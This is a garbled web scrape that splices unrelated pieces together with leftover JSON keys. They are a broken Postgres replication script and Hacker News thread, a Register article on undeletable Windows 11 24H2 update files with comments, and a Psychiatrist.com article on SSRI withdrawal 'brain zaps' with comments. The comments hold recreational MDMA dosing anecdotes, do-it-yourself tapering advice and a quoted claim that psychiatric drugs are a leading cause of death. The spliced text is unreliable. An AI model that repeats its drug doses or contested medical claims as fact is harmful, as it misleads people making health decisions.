-v ON_ERROR_STOP=1 --username \"$POSTGRES_USER\" --dbname \"$POSTGRES_DB\" > ${PGDATA}/postgresql.conf > ${PGDATA}/pg_hba.conf /dev/null 2>&1; do echo \"Still waiting...\" sleep 1 done echo \"Master is ready.

It waits until the master is fully up and running by continuously checking the connection to the master database. Once the master is ready, it stops the local PostgreSQL instance (if running), removes existing data, and performs a base backup from the master using `pg_basebackup`. After the backup is complete, it configures the replica by enabling `hot_standby` for read-only queries and setting the connection info for the master (including host, user, and password). Finally, it signals PostgreSQL that this instance should act as a standby by creating the `standby.signal` file. start-replica.sh #!/bin/bash set -e # Run the init-replica.sh script /docker-entrypoint-initdb.d/init-replica.sh # Start PostgreSQL exec docker-entrypoint.sh postgres Copy is used to start a PostgreSQL replica in a Docker container. It first runs the `init-replica.sh` script to handle the initialization and setup of the replication process. After initializing the replica, the script starts PostgreSQL using the default Docker entrypoint (`docker-entrypoint.sh`) with `postgres` as the argument to run the PostgreSQL service inside the container.

A simple cron task that pings a health check if everything is OK (lag isDo I need 2 replicas to avoid the split brain scenario? my brain hurts already. It will hurt even more. The recommended way is to set up a witness server. Yet another thing to manage in a properly designed Postgres cluster. Certainly not an easy/trivial thing to do, ops-wise. From [0]: > By creating a witness server in the same location (data centre) as the primary, if the primary becomes unavailable it's possible for the standby to decide whether it can promote itself without risking a \"split brain\" scenario: if it can't see either the witness or the primary server, it's likely there's a network-level interruption and it should not promote itself. If it can see the witness but not the primary, this proves there is no network interruption and the primary itself is unavailable, and it can therefore promote itself (and ideally take action to fence the former primary). An interesting acronym you'll hear is STONITH (in order to fence the former primary). [0] - https://www.repmgr.org/docs/current/repmgrd-witness-server.h... reply nolist_policy 4 hours agorootparentYou want STONITH anyways. It's all necessary complexity in a HA cluster. reply andix 1 hour agoparentprevYou’re completely right. You need a full management solution around postgres to make it work, and I wouldn’t recommend building it yourself. One solution is Kubernetes and one of the many postgres operators. Still not easy as pie. reply candiddevmike 5 hours agoparentprev> I'd pay to learn this with confidence. Great, there's a whole industry of PostgreSQL consultants/platforms ready to take your money. You could put on your tinfoil hat and say say PostgreSQL's lack of out of the box, integrated, easy to use HA is by design to make money. I think most folks use Patroni with some kind of service discovery solution like Kubernetes or Consul and have it abstract all of this for them. reply forinti 5 hours agoparentprevLag is one little detail that I find lacking in Streaming Replication. If there was no transaction in the last n seconds, it's going to tell you that lag is n s. Oracle's Dataguard will tell there's no lag, because the databases are the same. In a development database, lag can get quite high, but it makes no sense to set off an alarm if lag gets too high because it might just be that there was nothing going on. But the simplicity and reliability of Postgresql I much prefer over Oracle, any day of the week. reply WJW 5 hours agorootparentIf it's really a problem, you can always use the pt-heartbeat tool from the percona toolkit: https://docs.percona.com/percona-toolkit/pt-heartbeat.html Conceptually it is very straightforward: It just updates the only row in a special table to the current time every --interval seconds on the main database, then monitors the value in any followers to see which value they have. Subtract the two timestamps to get replication lag. reply forinti 5 hours agorootparentI'll check it out. Thanks. reply egnehots 4 hours agoparentprev> How do I check how many seconds the replica is lagging behind the master? Use PostgreSQL administrative functions, specifically: pg_last_xact_replay_timestamp. (https://www.postgresql.org/docs/current/functions-admin.html...) > How would I monitor the replica? A simple cron task that pings a health check if everything is OK (lag isHow do I failover to the replica if the primary goes down? > Should I handle failover automatically or manually? > Do I need two replicas to avoid a split-brain scenario? My head hurts already. While it may be tempting to automate failover with a tool, I strongly recommend manual failover if your business can tolerate some downtime. This approach allows you to understand why the primary went down, preventing the same issue from affecting the replica. It's often not trivial to restore the primary or convert it to a replica. YOU become the concensus algorithm, the observer, deciding which instance become the primary. Two scenarios to avoid: * Falling back to a replica only for it to fail (e.g., due to a full disk). * Successfully switching over so transparently that you will not notice that you're now running without a replica. > After a failover (whether automatic or manual), how do I reconfigure the primary to be the primary again, and the replica to be the replica? It's easier to switch roles and configure the former primary as the new replica. It will then automatically synchronize with the current primary. You might also want to use the replica for: * Some read-only queries. However, for long-running queries, you will need to configure the replication delay to avoid timeouts. * Backups or point-in-time recovery. If you manage yourself a database, I strongly recommand to gain confidence first in your backups and your ability to restore them quickly. Then you can play with replication, they are tons of little settings to configure (async for perf, large enough wall size to restore quickly, ...). It's not that hard, but you want to have the confidence and the procedure written down before you have to do it in a production incident. reply meow_catrix 5 hours agoparentprevThe modern way is to sidestep the issue altogether and use Kubernetes with a database designed to run on Kubernetes. You can get sharding, replication and leader election essentially for free - you can concentrate on using the database instead of running the database. Compute is really cheap compared to engineering man-hours. reply kachapopopow 4 hours agorootparenthttps://artifacthub.io/packages/helm/bitnami/postgresql, postgres is fortunately one of them.

For example CloudnativePG. It’s not just replication what you need. It’s failover, recovery, monitoring, self-healing, backups, and so on. Are there any other free/open implementations outside of kubernetes? reply klaussilveira 39 minutes agoprevFor the K8S folks: https://stackgres.io reply kachapopopow 4 hours agoprev [–] I see this as one of the reasons to use kubernetes (& helm). https://artifacthub.io/packages/helm/bitnami/postgresql Configures all of this for you with near zero additional configuration required.

    "originBody": "OSes 31 Windows 11 24H2 hoards 8.63 GB of junk you can't delete 31 When the 'cleanup' option stubbornly refuses Richard Speed Fri 11 Oct 2024 // 18:30 UTC Windows 11 24H2 users are finding there is undeletable data that remains on their devices after installing the recently released feature update. Microsoft hits go on Windows 11 24H2: Fresh features, bugs, and a whole lotta AI READ MORE The known issues list has not grown in the days since the rollout on October 15, however, for many users – this writer included – attempts to clean up the detritus after the update has left 8.63 GB of disk space occupied by \"Windows Update Cleanup.\" Having file remnants after a Windows update is not unusual, and, according to Microsoft, \"Windows keeps copies of all installed updates from Windows Update, even after installing newer versions of updates.\" Space taken up by the old versions can be reclaimed – at least that's the idea. The Windows Settings application or the delightfully retro Disk Cleanup tool can be used to clear the temporary files from storage. However, that 8.63 GB of data appears to persist regardless of how often a user attempts to delete it or restarts Windows 11. A scan of Microsoft's Feedback Hub confirms numerous users are affected. PC shipments stuck in neutral despite AI buzz Microsoft cleans up hot mess of Patch Tuesday preview Copilot's crudeness has left Microsoft chasing Google, again Microsoft issues 117 patches – some for flaws already under attack El Reg asked Microsoft if it was aware of the problem and when it would be addressed. The Windows vendor has yet to respond - which is pretty much par for the course these days. However, it likely has something to do with how updates are handled in the brave new world of Windows 11 24H2. In July, Microsoft said it would implement checkpoint cumulative updates in Windows 11 24H2 and Windows Server 2025. The stated goal of this change is to reduce the size of updates, but a consequence is that a checkpoint is needed from which to start. This is likely the reason why that 8.63 GB appears for some users. The problem is that Windows 11 lists those files as old updates that the user can delete, even when the clean-up tools cannot remove the files. It is possible to remove them manually, but doing so could cause issues when the next set of updates arrive. The need for storage is unlikely to change in the near future. However, the way Windows reports its use will itself need to be updated for the sake of all of those users confused about why they cannot reclaim the space that Windows insists they can. ® Sponsored: Where AI meets everyday business apps Share More about Microsoft Operating System Storage More like these × More about Microsoft Operating System Storage Windows Windows 11 Narrower topics Active Directory Android Azure Backup Bing Bitlocker Blu-Ray BSoD CentOS Debian DRAM Elementary OS Excel Exchange Server Firmware HDD HoloLens In-Memory Internet Explorer iOS LinkedIn Linux macOS Microsoft 365 Microsoft Build Microsoft Edge Microsoft Ignite Microsoft Office Microsoft Surface Microsoft Teams .NET Network Attached Storage Office 365 OS/2 Outlook Patch Tuesday Pluton PowerShell Qubes Semiconductor Memory SharePoint Skype Snowflake Inc.

Personally, I think this has the same root cause as Microsoft trying to force everyone to log on to the local machine with an online Microsoft account, and telemetry that even the administrator can not completely turn off. They want to gather personal interest data from your your computer use to fill out your online advertising profile. They are looking to fully embrace the surveillance capitalism business model that has previously been so successful at Google and Meta. reply Salgat 1 hour agorootparentI think it's simpler. They were tired of their name and OS being dragged through the mud by your average user who has no idea what they're doing. So they started forcing updates, providing their own anti-virus, started adding lots of metrics to track what your average user was actually doing, and tied your documents to an account with cloud storage so that when the user inevitably broke something, it was recoverable in an easy manner.

People who are arguing for freedom to mess up their own computer and those of the tech-illiterate (the kernel access maximalists, the people conflating code signing with corporate oversight) are arguing for giving general computing to closed systems because a majority of users need protection from themselves. reply gmueckl 2 hours agorootparentprevThey were always like this. They deliberately broke early Windows compatibility with non-MS DOS implementations for no good technical reason. They bundled Internet Explorer as an unremovable component of Windows during their browser war with Netscape and made it hard to change defaults. They artificially added nonsense dependencies on IE throughout the OS like \"ActiveDesktop\", which rendered an HYML page as your desktop background. They created the atrocious Windows 8 desktop shell changes (now entirely rolled back) in a desperate effort to gain tablet market share. They added extensive phone-home telemetry with an uninspectable data stream that seemed to log every keystrokes at some point. They try to force the use of Microsoft Accounts to log into Windows. The current replay effort is only remarkable among all the other user-hostile changes in that it is a the biggest invasion of user privacy yet.

Azure and everything in its orbit are the stars of the company now; Windows is more and more of a distraction and an expense that needs to find ways to fund itself since consumers aren't willing to pay for a desktop OS, much less for constant updates.

But also, if you look at their 2023 report[1] it is contracting substantially: Windows revenue decreased $3.2 billion or 13% driven by a decrease in Windows OEM. Windows OEM revenue decreased 25% as elevated channel inventory levels continued to drive additional weakness beyond declining PC demand. Windows Commercial products and cloud services revenue increased 5% driven by demand for Microsoft 365.

Think about why you dislike the word “enshittification”, it’s likely because the word is both very direct and is based on a swear word. These both give the word impact and switching to a word that doesn’t have these properties would likely have less impact and be less likely to catch people’s attention. Digging even deeper there is also a class dynamic as swear words are considered lower class. I don’t want to write an essay so I won’t go in-depth but “adult” and “mature” could also be considered code for “imitating the upper class” as the upper class loves to protect its identity and uses these dynamics in their favor. Consider for example how, historically, dressing in a suit is both considered upper class and mature, but what function does a suit really have? The primary function is signaling to other people. The point I’m making is that the upper class generally doesn’t want change, they want to keep their status and power. So many of the things we consider “adult” or “mature” tend to really be imitating the upper class and indirectly maintaining their power and the status quo. reply rererereferred 4 hours agoparentprevIs this Replay the same as Recall?

So, bought a Windows Laptop and a Surface Pro, explored that for a bit, and it was ... OK. I could see my hopes getting some kind of payoff with enough work, when I got around to the work. Until this OS-level surveillance stuff went down. And that's it. I can't imagine investing in their platforms. I can't imagine trusting that the product stakeholders are even capable of learning to act with user interests in mind, or that executive management that created a team making decisions this bad is capable of learning either. MacOS and Apple have their issues, but they haven't crossed that threshold yet and I can probably fix my backward compat issues with VMs. (Some responsibility for trusting MS has to fall on me given the \"fool me twice\" principle, it was clear that they were fundamentally untrustworthy at least as far back as the 90s antitrust trials, now also seems clear that the recent image rehab was exactly that: image, nothing more.) reply queuebert 2 hours agorootparentApple is pretty bad.

    "originBody": "In SSRI Withdrawal, Brain Zaps Go from Overlooked Symptom to Center Stage by Katie Brown July 10, 2023 at 9:05 AM UTC Clinical Relevance: Brain zaps are a disconcerting symptom of antidepressant withdrawal that should be addressed Brain zaps, a symptom of antidepressant discontinuation syndrome (ADS), are distressing and mysterious sensations experienced when stepping off SSRIs. Physicians were initially unaware or dismissive of brain zaps due to limited information and a focus on downplaying the addictive nature of antidepressants. Gradual tapering, switching to fluoxetine, and CBT during the discontinuation process can help mitigate brain zaps and other ADS symptoms. A sensation unofficially known as “brain zaps” has caused concern in patients stepping off of their SSRIs. Until recently, physicians have widely been unaware or dismissive of the symptom. Alexander Papp, MD, who has led studies published in The Primary Care Companion for CNS Disorders examining brain zaps, believes this may simply be due to the lack of available information. “There was an emphasis both within the [psychiatric] profession and pharmacological companies to make these medications sound not addictive,” he told Psychiatrist.com. Therefore, when SSRIs first became popular, very few systematic studies were conducted on antidepressant discontinuation effects. An Underappreciated Symptom of Antidepressant Withdrawal Study Tackles the Mystery of Brain Zaps Treatment Goals in MDD The tide seems to be shifting. Psychiatrists better understand a collection of symptoms that accompany stepping off of antidepressant use known as antidepressant discontinuation syndrome (ADS). But brain zaps still remain a bit of a mystery. An Off-Putting Sensation Brain zaps are a relatively uncommon ADS symptom. Those who have them say they can be quite distressing. “The way it’s described, they feel like an electrical sensation in the brain as if you were shocked inside your head—which is unusual because people usually don’t feel anything inside their heads,” said Papp. He clarified that while zaps, which typically last about one second each, feel like they’re coming from inside the brain tissue, they actually occur on the surface and around the nerves surrounding the lining of the brain. As far as scientists have been able to tell, brain zaps aren’t dangerous. But because the experience is so unfamiliar and uncomfortable, it is highly unsettling. “Some people think that they are having seizures. Some people think that they’re having a heart attack. Some people have no idea what’s happening. It can be a very scary state to be in,” Papp said. Perhaps the most disconcerting feature of the zaps is the jumpy lateral eye movements. “People actually hear their eyes move when they move their eyes from left to right. They almost feel a faint ‘whoosh’ sound in their heads,” Papp explained. “Sometimes, people feel as if the brain stops for a moment and reboots like a computer.” Patient Reaction Zaps can cause anxiety. Some people also report vertigo, insomnia, vision changes and balance problems. Psychiatrist.com asked a group of Reddit users from various antidepressant-focused subreddits including, r/antidepressants and r/SSRIs, about what brain zaps feel like. “Zaps are very similar to experiences I had after heavy weekends on ecstasy / MDMA in my younger years,” Reddit user u/heliskinki wrote in a direct message. “My brain ‘jumps’ forwards and I get a tingling feeling in my lips.” “They feel like jolts of electricity that make me stutter and force me to slow down,” explained u/CosmosisJone5. The sensation caused u/Remmy1319 to re-evaluate their decision to discontinue Zoloft, a sentiment shared by a number of Redditors. “Tried to come off Zoloft and was zapped out of my mind. I was on my meds for 14 months and I’m already thinking that I don’t have what it takes to face the withdrawals,” one anonymous Redditor commented. Some tapered off too quickly after experiencing unpleasant reactions to medication only to have those side effects replaced with withdrawal symptoms including brain zaps. “I was on 10 mg [Citalopram] for two weeks before deciding to stop as the depersonalisation was too much, plus the chest pains. I tapered down to 5mg for two days then came off completely over the course of a week, before starting to get brain zaps intermittently throughout the day,” u/FillPleasant wrote in a comment. Treatment Options The only thing that’s known to help prevent brain zaps is to stay on the antidepressant. Or at least avoid going cold turkey. Taper off extremely slowly or, as Papp suggested, “You can switch from a short half-life medication to fluoxetine (Prozac) and then taper down from that.” Gradually reducing the antidepressant agent with a long half-life has indeed been shown to reduce the severity of brain zaps and other kinds of discontinuation effects. “It really seems to me that the speed of drop in blood level is the [factor] that is most likely responsible for these brain zaps,” Papp said. “The medications where blood level drops faster are the ones that are most likely to cause brain zaps.” Undergoing cognitive behavioral therapy (CBT) during the tapering process may also help to decrease ADS symptoms, including the zaps. However, there’s no known cure, and for some people, they can be incredibly disruptive. Clinicians should note that they can become a barrier to successfully weaning off of medications, Papp advised. Discontinuing or reducing antidepressant dosage or using these meds irregularly can cause a variety of other unpleasant symptoms, which can include flu-like symptoms, insomnia, nausea, imbalance, sensory disturbances, and hyperarousal. “Eventually most people are able to get off their antidepressants, but there’s a small minority of people who are either never able to get off their antidepressants and continue to have these antidepressant discontinuation effects, including brain zaps, for years—sometimes even decades,” Papp said.",

I don't know why. It's a pretty well-known effect of fucking with your serotonin levels. Someone I know took about 4g of MDMA over a 4-day period and what followed was about 2 weeks of these \"brain zaps\", sleep paralysis with demons in the room (feeling like you are laying in bed with a demon coming towards you but you physically cannot move). This stuff has been known about for decades but unable to be researched due to the US' drug laws. Those brain zaps are apparently like just doing whatever you're doing, when BAM, it feels like an electric shock has gone through your head into the back of your eyes. reply jvanderbot 19 hours agoparentSSRIs are a huge help to me. I'm one of the lucky (?) ones. For those curious about what a brain zap is, it's like you're going about your normal business, then you feel a jolt like you're surprised, but only in your head. Then it's difficult to remember what you were thinking about prior to the zap. When it happened to me last, I stopped walking and couldn't resume my inner monologue/ train of thought. I just started walking and let another one conjure itself up. It's been decades since I've had one, Wellbutrin is much better. reply wruza 8 hours agorootparentWhen I went off SSRIs, these zaps were regular for two weeks, especially outside when something like a car crawls into your peripheral view. Ranged from a full zap to light “buffering reset”, as if you just skipped a second of your life. Idk how a doctor can just dismiss it.

Wellbutrin works via the dopaminergic pathway. Same receptors that are generally targets for ADHD. reply firecall 18 hours agoparentprevThats exactly the problem I'm having! Working with my GP to titrate off Sertraline (Zoloft) at the moment. My GP, like many others, wasnt really aware of the issues with getting off the drugs! I describe the brain zaps as like a wave of electricity. Like a Sci-Fi pulsing wave. As if i've got some sort of giant capacitor discharging in my brain. The sort of thing from a 50s Sci-Fi movie thats a tower of electricity, glowing and pulsing and radiating an electrical light show! Exactly the sort of thing that might re-animate Frankenstein! It's not painful as such, but it's debilitating and causes you to literally pause and make a sharp intake of breath. I hate being on the bloody things. Wish I'd never started them. CBT is much more effective in the long term, for me. YMMV. I find SSRIs kill my motivation and creativity. I'd really suggest anyone think twice before assuming these pills, that GPs dish out like candy, are an easy and consequence free solution! reply wruza 8 hours agorootparentI hate being on the bloody things. Wish I'd never started them. CBT is much more effective in the long term, for me. YMMV. I find SSRIs kill my motivation and creativity. That’s forbidden knowledge. For some reason they tend to just write you a recipe and see ya in a year, good luck with collateral damage to your life. SSRIs get advertised as making you indifferent to bad things, well, you become indifferent to all things. Like a vegetable. It’s an amplitude modulator, not a negative cut off. I wonder how much that correlates with “psychotypes” and general development, because it almost feels like you become an average normal person, and not in a good sense. Blind, dumbed (not dumb but unmotivated), indifferent, uninterested. Just living through a life with a sort of a brainfog. Maybe SSRIs show success in large enough groups for which this is a natural state?? Also you can’t come. Ever watched The Fist of Rage? Oh and if you hate bloody things, you’ll hate to cancel these much more :). Brain zaps are not the worst, it feels like all your psyche gets barely hinged together for quite a while. Like a wood house with every joint shaken a little for slack. I'd really suggest anyone think twice before assuming these pills, that GPs dish out like candy, are an easy and consequence free solution! Full agree. reply TexanFeller 16 hours agorootparentprevSomeone close to me is doing the same. Sertraline isn't easily available in tiny dose increments useful for weaning off gradually, and its half life isn't very long, so missing or reducing a dose is almost immediately noticeable for some people. A strategy that's helped is cross-titrating and switching to Prozac. Because Prozac has a massively longer half life it's a much smoother ride while you're gradually reducing it. reply mh- 15 hours agorootparentGeneric sertraline comes in pill/tablet form, you can just use a pill splitter to get smaller increments. I just googled to confirm this before posting, and they're even scored down the middle for easy splitting. reply TexanFeller 15 hours agorootparentRight, but splitting isn't sufficient for many people. The person I know was on 50mg. They tried to carefully shave off 1/8th initially, then 1/4 etc. It was error prone cutting them exactly and even a 1/8th change in dose at a time with a two week adjustment period caused them to have terrible effects. They cross titrated to Prozac and it became easy to taper down slowly. Reddit and forums are full of people that needed to reduce Sertraline by 1-5mg at a time over a period of months if they've been taking it long term. I think far more people might find that they need to taper very slowly if more people got past the first step of tapering instead of just staying on them indefinitely. Many people feel more anxious and depressed on a slightly lower dose and take that as confirmation that they were born needing it, when it might be more the case that their brain has adapted to depend on it. If they were able to reduce more slowly and comfortably this might be more obvious. That matches what I saw with the person I know who is finally doing well on low dose Prozac. reply eric-hu 11 hours agorootparent> Right, but splitting isn't sufficient for many people. The person I know was on 50mg. They tried to carefully shave off 1/8th initially, then 1/4 etc. It was error prone cutting them exactly and even a 1/8th change in dose at a time with a two week adjustment period caused them to have terrible effects. This was the case for me! It took me months to titrate down to 0 from Sertraline. Withdrawal side effects were terrible, and I’m pretty turned off to SSRIs in general now. My past doctors talked them up as “safe”, and treated the ramp down process as a tiny inconsequential mention. I had tried to stop after stabilizing on a half dose, 1/4 dose, etc., and the side effects were too unpleasant so I had to start back up. I could only stop after I titrated down to 1/8th, every other day. reply mh- 15 hours agorootparentprevAh, I see, I mistakenly thought it came in smaller doses than 25mg. reply Scoundreller 13 hours agorootparentprevMaybe where you are it comes in tablet form. All capsules in Canada. (Though in theory the contents should be homogenized, so you could dump the powder and take a proportion of it) reply survivedurcode 20 hours agoparentprevI think there’s more to it than just messing with serotonin. There’s something about Sertraline (Zoloft) that seems to make it quite reliable at causing brain zaps. 3 people I’ve known who stopped Sertraline all experienced brain zaps. 1 of those people also talked about stopping Prozac (cold turkey) and Lexapro (4wk taper) and did not have the zaps, but a 4-month taper of Sertraline was not enough to avoid them. In fact in the article they recommend switching to Prozac and then tapering that, as a way to avoid the zaps. reply wormius 15 hours agorootparentI don't know enough specifics, but there's multiple subtypes of serotonin receptors. It's possible that perhaps Sertraline affects different subtypes or a combination. Perhaps the binding affinity is different, but yeah, each of these are different (hence why they're different drugs, and not just generics of the same thing). I've had a brainzap when I was used MDMA somewhat regularly for a short period in the 90s. It was only once, so it was more a weird \"What is this? I feel... something... in my brain?\" But I don't think I would want to deal with it happening spontaneously and constantly like withdrawal symptoms present. Sounds awful. I take Effexor which is an SNRI... From what I've read, is one of the worst in terms of withdrawal (brainzaps and other side-effects). I'm really not liking the idea of me having to someday go off of it, so far for now it keeps me stable, but... if something happened where I would need to go off of it, I'm not looking forward to it. reply heavyset_go 14 hours agorootparentprevProzac has a notoriously long half-life, which is one of the reasons it's indicated for adolescents who are likely to skip/forget doses. The long half-life is also the reason it's prescribed for SSRI withdrawal symptoms. Sertraline is a potent SSRI in terms of inhibiting the serotonin transporter protein itself. It also has a relatively short half-life. Makes sense that cessation would induce withdrawal symptoms. It's the same principle behind prescribing Suboxone for opioid withdrawal. The drug has a ridiculously long half-life, so it has the potential to smooth out what would otherwise be acute withdrawal. reply spangry 17 hours agorootparentprevI've heard similar about Zoloft, and Effexor (which is notorious for causing withdrawal symptoms when coming off it). I believe Lexapro is a highly selective SSRI, which might explain its lack of withdrawal symptoms (and also its \"does absolutely nothing\" effect for some people). Prozac has a very long half-life compared to other SSRIs so it's basically got an in-built taper, and is why it's often 'cross-tapered' to when coming off another SSRI. reply TexanFeller 15 hours agorootparentI took Lexapro for a month one time. Luckily I happened to also be seeing an endocrinologist so I happened to have before and after blood work. A few weeks after Lexapro my prolactin level spiked to far higher than is normal for a male. The endocrinologist was worried I had a prolactinoma and had me get an MRI! I stopped Lexapro and gradually the prolactin level went back to normal, but it took a while. There are far more effects from these drugs than are well documented or acknowledged by most of the medical community. I had to go digging myself to find studies and case reports connecting SSRIs to elevated prolactin and suggest the possibility to my doctors who said that's the first they'd heard about it. If your hormones are messed up or you're feeling more gender nonconforming, work with your doctor to see if it's your SSRI. reply sbrother 16 hours agorootparentprevI’ve been on Lexapro for a few years now, and if I skip it for a couple days I get very unpleasant brain zaps and dizziness. If this is a lack of withdrawal symptoms then I hate to imagine what other SSRIs cause! Still, it’s been a life changing drug for me and I haven’t really had any bad side effects while I’ve been taking it. reply SOLAR_FIELDS 15 hours agorootparentI took Lexapro for a short period in my early 20's. Perhaps like 3-4 months. I definitely remember having significant brain zaps when I quit. It was a pretty low dose I was taking too - 10mg IIRC. Definitely no more than 20mg. I don't remember the zaps causing me significant stress at the time, but that was primarily because I knew to expect the zaps going in to the experience. Education helps a lot with anxiety. If people know to expect it, and that we are pretty sure that it's completely harmless but uncomfortable, the general anxiety around the symptom will probably be less. reply Blackthorn 15 hours agorootparentprevIt's different for everyone. I've been on it for over ten years and have never experienced any of these zaps. When I attempted to go off I just got extremely depressed. Never any zap though. reply csydas 8 hours agoparentprevI think some other posters already commented, but I wouldn't put too much stock in the MDMA being MDMA -- I use MDMA pretty frequently and never had brain zaps from it, but when I was on sertraline and quit without tapering off, I definitely had the brain zaps being described, and I still get them almost 15 years after discontinuing sertraline. MDMA depending on where you are and what you got can be quite a few things, it's why test kits are important. It's not to say that MDMA cannot cause brain zaps, but given that we know that MDMA is usually cut with a lot of filler/other drugs without the user knowing, I would acknowledge it could do it, but would always have doubt it was actually the MDMA due to the knowledge that whatever the users who experienced brain zaps took likely had many other drugs/substances in it. In the current political climate surrounding drugs, I'm not even sure how a study could effectively be done correctly. Which is unfortunate because brain zaps really suck and withdrawal from SSRIs is pretty rough. I easily get into addictive substances, and have successfully stopped use on quite a few pretty heavy things, and they didn't come close to the withdrawals from SSRIs for me. This is personal experience of course, and likely many other factors in my life helped with my stopping some recreational drugs without hugely adverse affects, but SSRIs just nothing helped and at the time (2010-2015), I really couldn't find any reliable information online or from doctors about the brain zaps. I'm glad to read this article because it's great to see that there is attention to this and more focus on the side effects of SSRIs. SSRIs definitely can help many people, but it is pretty intense drug and the withdrawal is nasty for quite a few people. reply zktruth 6 hours agorootparentI don't know why you're so skeptical that a drug possessing the primary effect of flooding one's brain with serotonin can cause SSRI withdrawal symptoms upon cessation. As for whether or not it's 'really MDMA', not everybody is popping pressed ecstasy tablets.

A normal recreational dose would be 0.1g-0.2g once every few months. (I have no idea whether this dose is safe or not, just saying it's a common one for people to take.) A bad thing about MDMA is that you become tolerant to it very quickly, so people who do it too regularly need to take more and more over time to feel the effects. That's probably what happened to the parent comment's friend. reply Jerrrrrrry 15 hours agorootparentHaving experienced this exact dosage, I can attest it is more of just raw dragon-chasing juxtaposed with an insane tolerance curve. The euphoria caused by MDMA combined with literally any other drug (MDMA is like ketchup, can be combined with anything) synergizes and can quickly escalate to rampant re-dosing that _exponentially_ increases tolerance, all while preventing the receptor to re-regulate. The \"sads\" following MDMA binges are so ironically over-bearing to a point of near artificial-ness and it is nearly obviously attributable to the chemical. MDPM/6-APB are interesting as they are euphoric and serotonic but with less manic depressive the next circadian cycle. reply morkalork 20 hours agorootparentprevI've seen someone do 1g over the course of a long evening but they were a seasoned user.

SSRIs are relatively safe 2. The actual mechanisms of action of SSRIs are not fully understood 3. SSRIs have been prescribed so widely in the last few decades SSRIs are extremely well studied in scientific literature. To be clear when I say well studied I mean that the corpus of literature is broad, not that the corpus is comprehensive to the point that it can be claimed a solved problem. If you would like lots of placebo blind controlled trials and a bunch of different ways of looking at the problem you will find a welcome home in SSRI's. Note also that I'm not saying SSRI's are a great solution to every problem simply because they are well studied. They just have a lot of data points for people to use to make informed decisions.

Seems like another example of: \"Deadly Psychiatry and Organised Denial\" https://www.deadlymedicines.dk/deadly-psychiatry-and-organis... \"Deadly Psychiatry and Organised Denial explains in evidence-based detail why the way we currently use psychiatric drugs does far more harm than good. Professor, Doctor of Medical Science, Peter C. Gøtzsche documents that psychiatric drugs kill more than half a million people every year among those aged 65 and above in the United States and Europe. This makes psychiatric drugs the third leading cause of death, after heart disease and cancer. Gøtzsche explains that we could reduce our current usage of psychotropic drugs by 98% and at the same time improve patients’ mental and physical health and survival. It can be difficult, however, to come off the drugs, as many people become dependent on them. As the withdrawal symptoms can be severe, long-lasting and even dangerous, slow tapering is usually necessary. In his book, Gøtzsche debunks the many myths that leading psychiatrists – very often on drug industry payroll – have created and nurtured over decades in order to conceal the fact that biological psychiatry has generally been a failure. Biological psychiatry sees drugs as the “solution” for virtually all problems, in marked contrast to the patients’ views. Most patients don’t respond to the drugs they receive but, unfortunately, the psychiatrists’ frustrations over the lack of progress often lead to more diagnoses, more drugs and higher doses, harming the patients further.\" Other alternatives for health and wellness I have collected: https://github.com/pdfernhout/High-Performance-Organizations... One example from there: \"The Depression Cure: The 6-Step Program to Beat Depression without Drugs\" by Stephen S. Ilardi From the Amazon book blurb: \"In the past decade, depression rates have skyrocketed, and one in four Americans suffer from major depression at some point in their lives. Where have we gone wrong? Dr. Stephen Ilardi sheds light on our current predicament and reminds us that our bodies were never designed for the sleep-deprived, poorly nourished, frenzied pace of twenty-first century life. Inspired by the extraordinary resilience of aboriginal groups like the Kaluli of Papua New Guinea, Dr. Ilardi prescribes an easy-to-follow, clinically proven program that harks back to what our bodies were originally made for and what they continue to need with these six components: * Brain Food [supplement with Omega 3s; remember your brain is mostly fat] * Don't Think, Do [avoid excessive rumination by doing things] * Antidepressant Exercise [aerobic exercise is medicine] * Let There Be Light [get natural sunlight and supplement as needed with vitamin D3] * Get Connected [engage in face-to-face social activities regularly] * Habits of Healthy Sleep [get enough sleep by following basic guidelines] The Depression Cure's holistic approach has been met with great success rates, helping even those who have failed to respond to traditional medications. For anyone looking to supplement their treatment, The Depression Cure offers hope and a practical path to wellness for anyone.\" TL;DR as Ilardi says: \"We were never designed for the sedentary, indoor, sleep-deprived, socially-isolated, fast-food-laden, frenetic pace of modern life. (Stephen Ilardi, PhD)\" That said, if you are on prescription psychotropic meds already, do not stop taking them or change doses without some medically-approved plan for getting off them. Peter Gøtzsche wrote an entire book about that: \"Mental Health Survival Kit and Withdrawal from Psychiatric Drugs: A User's Guide\" https://www.amazon.com/Mental-Health-Survival-Withdrawal-Psy... \"This book can help people with mental health issues to survive and return to a normal life. Citizens believe, and the science shows, that medications for depression and psychosis and admission to a psychiatric ward are more often harmful than beneficial. Yet most patients take psychiatric drugs for years. Doctors have made hundreds of millions of patients dependent on psychiatric drugs without knowing how to help them taper off the drugs safely, which can be very difficult. The book explains in detail how harmful psychiatric drugs are and gives detailed advice about how to come off them. You will learn: ... that psychiatric drugs should never be stopped abruptly because withdrawal reactions can be dangerous...\" reply hirvi74 16 hours agorootparentSo, basically be rich enough to not work? There is probably some true to this advice, but the issue is not that it's some hidden secret, it's that fact that is basically infeasible for a majority of people.

Almost every doctor or psychiatrist I've seen or my family members have seen usually start off too strong and in many cases will advise cutting cold turkey.

The closest I could get was feeling deeply sad watching a movie with an emotional scene and realizing I didn't feel any emotion. I decided to quit mainly because of that and other issues (mainly sex taking forever and feeling a bit hollow). I halved my dose every 3 weeks and stopped around 5mg (from 40mg). The zaps fucking sucked and lasted heavily for ~2 months. Even now 8+ years later every once in awhile I get that kind of rollercoaster drop feeling in my head every few days that had preceded my zaps previously. It would feel like an initial void in my head, followed by a shock travelling from my feet to my head and I'd legitimately jerk my whole body while it happened. It made me feel depersonalized and I found it most tolerable dissociating physically and just mentally observing the effect occur. Walking seemed to trigger it the most, but I definitely had some times trying to sleep where I just felt completely zapped with discomfort (less electrical fwiw). I would have to smoke a ton of weed to sleep and still feel a lingering disconnect from my physical self. Paxil initially helped a ton with my social anxiety and depression (likely triggered by feeling of inadequacy and being left behind my peers). Now I'm awaiting a diagnosis for ASD. I've been able to cope decently without SSRIs/SNRIs but have more or less accepted the feeling of incompleteness that follows me eternally. I still feel generally lost in life purpose, but have accepted that as best I can.

But frankly the doctor who prescribed larger and larger doses of Venlafaxine shouldn’t have been qualified either. It’s a much more potent norepinephrine reuptake inhibitor than it is for serotonin.

    "originSummary": [
